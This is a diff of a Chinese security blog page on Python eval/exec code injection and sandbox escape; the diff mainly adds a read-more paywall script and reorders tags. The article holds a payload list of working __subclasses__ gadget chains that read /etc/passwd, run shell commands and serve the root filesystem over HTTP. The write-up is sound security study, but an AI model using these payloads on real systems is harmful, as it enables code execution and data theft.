@@ -206,7 +206,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介<br>python中可以产生代码注入的函数主要是<code>eval</code>和<code>exec</code>，eval用于执行python代码表达式，exec用于执行python代码段；此外，python2中，内置的input函数等效于<code>eval(raw_input)</code>可产生代码注入</p>
+        <div id="vip-container"><p>简介<br>python中可以产生代码注入的函数主要是<code>eval</code>和<code>exec</code>，eval用于执行python代码表达式，exec用于执行python代码段；此外，python2中，内置的input函数等效于<code>eval(raw_input)</code>可产生代码注入</p>
 <a id="more"></a>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
 <li>无限制，利用内建函数渗透</li>
@@ -222,7 +222,23 @@
 <p>首先输入<code>&#39;owef&#39;.__class__</code>查看字符串owef所属的类，然后输入<code>&#39;owef&#39;.__class__.__base__</code>访问基类，输入<code>&#39;owef&#39;.__class__.__base__.__subclasses__()</code>访问object类的子类；在object的子类中，”zipimporter”用于从egg安装包中动态导入python模块，在被攻击机器上提前防止configobj的egg安装包或zip安装包，使用<code>[ x for x in &#39;owef&#39;.__class__.__base__.__subclasses__() if x.__name__ == &#39;zipimporter&#39; ][0](&#39;/Users/shengnanwu/Documents/workspace/hacker/tools/python_exploit/configobj-5.0.6.egg&#39;).load_module(&#39;configobj&#39;).os.system(&#39;whoami&#39;)</code>进行动态加载模块，执行操作系统命令；<br><img src="eval_limit_1.png" alt="eval_limit_1.png"></p>
 <h4 id="防御代码注入"><a href="#防御代码注入" class="headerlink" title="防御代码注入"></a>防御代码注入</h4><h4 id="感谢-提供的一份payload-list"><a href="#感谢-提供的一份payload-list" class="headerlink" title="感谢@提供的一份payload list"></a>感谢@<a href></a>提供的一份payload list</h4><p>python2 list<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'THIS IS A PYTHON EVAL INTERPRETED OUTPUT'</span>)</span><br><span class="line">exit()</span><br><span class="line">sum(xrange(<span class="number">-999999999</span>,<span class="number">99999999</span>))</span><br><span class="line"> </span><br><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">open(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">__import__[<span class="string">'fileinput'</span>].input(<span class="string">'/etc/passwd'</span>)</span><br><span class="line">__import__[<span class="string">'os'</span>].system(<span class="string">'cat /etc/passwd'</span>)</span><br><span class="line">__import__[<span class="string">'os'</span>].popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">__import__[<span class="string">'os'</span>].system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>)</span><br><span class="line"> </span><br><span class="line">print(file(<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">print(open(<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">print(__import__[<span class="string">'fileinput'</span>].input(<span class="string">'/etc/passwd'</span>))</span><br><span class="line">print(__import__[<span class="string">'os'</span>].system(<span class="string">'cat /etc/passwd'</span>))</span><br><span class="line">print(__import__[<span class="string">'os'</span>].popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">print(__import__[<span class="string">'os'</span>].system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>))</span><br><span class="line">(<span class="keyword">lambda</span> fc=(<span class="keyword">lambda</span> n: [ c <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> c.__name__ == n ][<span class="number">0</span>]): fc(<span class="string">"function"</span>)( fc(<span class="string">"code"</span>)(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">"KABOOM"</span>,(),(),(),<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">""</span>),&#123;&#125;)())()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>](<span class="string">'THIS IS A PYTHON EVAL INTERPRETED OUTPUT'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'exit'</span>]()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'sum'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'xrange'</span>](<span class="number">-999999999</span>,<span class="number">99999999</span>))</span><br><span class="line"> </span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'fileinput'</span>).input(<span class="string">'/etc/passwd'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cat /etc/passwd'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>)</span><br><span class="line"> </span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'fileinput'</span>).input(<span class="string">'/etc/passwd'</span>))</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cat /etc/passwd'</span>))</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>))</span><br></pre></td></tr></table></figure></p>
 <p>pythond3 list<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'THIS IS A PYTHON EVAL INTERPRETED OUTPUT'</span>)</span><br><span class="line">exit()</span><br><span class="line">sum(xrange(<span class="number">-999999999</span>,<span class="number">99999999</span>))</span><br><span class="line"> </span><br><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">open(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">__import__[<span class="string">'fileinput'</span>].input(<span class="string">'/etc/passwd'</span>)</span><br><span class="line">__import__[<span class="string">'os'</span>].system(<span class="string">'cat /etc/passwd'</span>)</span><br><span class="line">__import__[<span class="string">'os'</span>].popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">__import__[<span class="string">'os'</span>].system(<span class="string">'cd /; python -m http.server'</span>)</span><br><span class="line"> </span><br><span class="line">print(file(<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">print(open(<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">print(__import__[<span class="string">'fileinput'</span>].input(<span class="string">'/etc/passwd'</span>))</span><br><span class="line">print(__import__[<span class="string">'os'</span>].system(<span class="string">'cat /etc/passwd'</span>))</span><br><span class="line">print(__import__[<span class="string">'os'</span>].popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">print(__import__[<span class="string">'os'</span>].system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>))</span><br><span class="line"> </span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>](<span class="string">'THIS IS A PYTHON EVAL INTERPRETED OUTPUT'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'exit'</span>]()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'sum'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'xrange'</span>](<span class="number">-999999999</span>,<span class="number">99999999</span>))</span><br><span class="line"> </span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'fileinput'</span>).input(<span class="string">'/etc/passwd'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cat /etc/passwd'</span>)</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>)</span><br><span class="line"> </span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'fileinput'</span>).input(<span class="string">'/etc/passwd'</span>))</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cat /etc/passwd'</span>))</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'/etc/passwd'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'print'</span>]([x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'cd /; python -m SimpleHTTPServer'</span>))</span><br></pre></td></tr></table></figure></p>
+</div>
 
+			<script src="https://my.openwrite.cn/js/readmore.js" type="text/javascript"></script>
+			<script>
+			var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
+			if (!isMobile) {
+			    var btw = new BTWPlugin();
+			    btw.init({
+			        "id": "vip-container",
+			        "blogId": "25728-1613867111621-341",
+			        "name": "安全研究日志",
+			        "qrcode": "http://81.69.171.187/qrcode.jpg",
+			        "keyword": "vip"
+			    });
+			}
+			</script>
+		
       
 
       
@@ -394,9 +410,8 @@
     <div id="footer-info">
     	<div class="footer-left">
     		&copy; 2021 owefsad
-    	</div>
-      	<div class="footer-right">
-		<span id="busuanzi_container_site_uv">访客数:<span id="busuanzi_value_site_uv"></span>人</span>
+			&nbsp;&nbsp;
+			<span id="busuanzi_container_site_uv">访客数:<span id="busuanzi_value_site_uv"></span>人</span>
       	</div>
     </div>
   </div>
@@ -487,6 +502,34 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">escalage_privilege</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">magento</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">JAVA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">JVM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内存管理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内存区域</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">escalate_privilege</a>
               </li>
              
@@ -527,34 +570,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">JAVA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">JVM</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内存管理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内存区域</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">escalage_privilege</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">magento</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -571,11 +586,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">分页</a>
+                <a href="javascript:void(0)" class="js-tag color3">logging</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">logging</a>
+                <a href="javascript:void(0)" class="js-tag color3">分页</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,22 +674,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">privilege_escalate</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cve</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">unrealircd</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">steghide</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">windows</a>
               </li>
              
@@ -691,11 +690,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">MS08-067</a>
+                <a href="javascript:void(0)" class="js-tag color4">privilege_escalate</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">dnsadmins</a>
+                <a href="javascript:void(0)" class="js-tag color4">cve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">unrealircd</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">steghide</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">MS08-067</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -716,18 +727,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">HQK Reporting Service V1.2</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">zone_transfer</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">LFI</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Hijacking</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -755,6 +754,22 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">dnsadmins</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">zone_transfer</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">LFI</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Hijacking</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">misc</a>
               </li>
              
@@ -775,14 +790,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">OS命令执行</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ssl</a>
               </li>
              
@@ -796,6 +803,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">symblink</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">OS命令执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -879,14 +894,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码规范</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">重构</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">iast</a>
               </li>
              
@@ -924,6 +931,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">CouchDB</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码规范</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">重构</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -967,14 +982,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">actuator</a>
-              </li>
